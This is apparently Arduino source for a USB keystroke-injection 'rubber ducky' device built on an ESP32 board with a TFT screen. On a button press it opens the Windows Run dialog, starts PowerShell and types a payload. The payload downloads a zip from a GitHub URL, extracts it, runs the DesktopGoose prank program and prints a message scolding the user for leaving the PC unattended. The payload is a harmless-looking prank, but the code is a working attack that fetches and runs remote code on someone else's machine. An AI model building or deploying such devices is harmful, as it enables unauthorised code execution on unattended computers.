#include <AnimatedGIF.h>
#include <Arduino.h>
#include <ezButton.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <USB.h>
#include <USBHIDKeyboard.h>

#include "duck.h"

#define BUTTON_PIN 0
#define GIF_IMAGE duck


AnimatedGIF gif;
USBHIDKeyboard Keyboard;
ezButton button(BUTTON_PIN);
TFT_eSPI tft = TFT_eSPI(135, 240);
bool shouldPlayGif = false;
volatile bool usbReady = false;

// Draw a line of image directly on the LCD
void GIFDraw(GIFDRAW *pDraw, TFT_eSPI tft);

void usbEventHandlerWrapper(void *arg, const char *event_base, int32_t event_id, void *event_data)
{
  switch (event_id)
  {
  case ARDUINO_USB_STARTED_EVENT:
    usbReady = true;
    Serial.println("USB Started. Device is ready.");
    break;
  case ARDUINO_USB_STOPPED_EVENT:
    usbReady = false;
    Serial.println("USB Stopped.");
    break;
  case ARDUINO_USB_SUSPEND_EVENT:
    Serial.println("USB Suspended.");
    break;
  case ARDUINO_USB_RESUME_EVENT:
    Serial.println("USB Resumed.");
    break;
  }
}

void setup()
{
  Serial.begin(115200);
  tft.begin();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(0, 0);

  gif.begin(BIG_ENDIAN_PIXELS);

  USB.onEvent(usbEventHandlerWrapper);
  USB.begin();
  Keyboard.begin();

  unsigned long timeout = millis() + 5000;
  while (!usbReady && millis() < timeout)
  {
    delay(10);
  }
  Serial.println(usbReady ? "USB is ready." : "USB did not become ready within timeout.");
  tft.drawString(usbReady ? "Quack is ready" : "Quack is broken", 0, 0);

  button.setDebounceTime(50);
}

void sendKeystrokes(const char *text)
{
  while (*text)
  {
    if (usbReady)
    {
      Keyboard.print(*text);
    }
    delay(1); // Small delay to ensure keystrokes register
    text++;
  }
  if (usbReady)
  {
    Keyboard.write(KEY_RETURN);
  }
}

void openPowerShell()
{
  if (!usbReady)
    return;

  // Press Win + R to open the Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500);

  // Type 'powershell' and press Enter
  sendKeystrokes("powershell");
  Keyboard.write(KEY_RETURN);
  delay(1200);
}

void executePayload()
{
  const char *payload = 
    "$zipPath='.\\DesktopGoose.zip';"
    "$extractPath='.\\DesktopGoose';"
    "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/OwendB1/DesktopGooseDownload/production/DesktopGoose.zip' -OutFile $zipPath;"
    "Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force;"
    "if (Test-Path \"$extractPath\\GooseDesktop.exe\") { Start-Process -FilePath \"$extractPath\\GooseDesktop.exe\" };"
    "Write-Host \"You left your PC unattended at work! That is not super smart....\";"
    "Write-Host \"You've gotten goosed for that reason.\";"
    "Write-Host \"Press Spacebar inside this window to remove it now...\";"
    "while ($true) {"
        "if ([console]::KeyAvailable) {"
            "$key = [console]::ReadKey($true).Key;"
            "if ($key -eq 'Spacebar') {"
                "if (Test-Path \"$extractPath\\Close Goose.bat\") {"
                    "Start-Process -FilePath \"$extractPath\\Close Goose.bat\" -Wait;"
                "};"
                "Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue;"
                "Write-Host \"DesktopGoose has been removed!\";"
                "exit;"
            "}"
        "}"
    "}";


  sendKeystrokes(payload);
  delay(10);
  Keyboard.write(KEY_RETURN);
}

void loop()
{
  button.loop();
  if (button.isReleased())
  {
    tft.setRotation(0);
    Serial.println("Button pressed. Executing HID actions & playing GIF...");
    shouldPlayGif = true;
    openPowerShell();
    executePayload();
    }

  if(shouldPlayGif) {
    if (gif.open((uint8_t *)GIF_IMAGE, sizeof(GIF_IMAGE), 
    [](GIFDRAW *pDraw) { GIFDraw(pDraw, tft); })) {
    Serial.println("GIF opened successfully.");
    tft.startWrite();
    while(gif.playFrame(true, NULL)) {
      yield();
    }
    gif.close();
    tft.endWrite();
    } else {
    Serial.println("Failed to open GIF.");
    }
  }
}
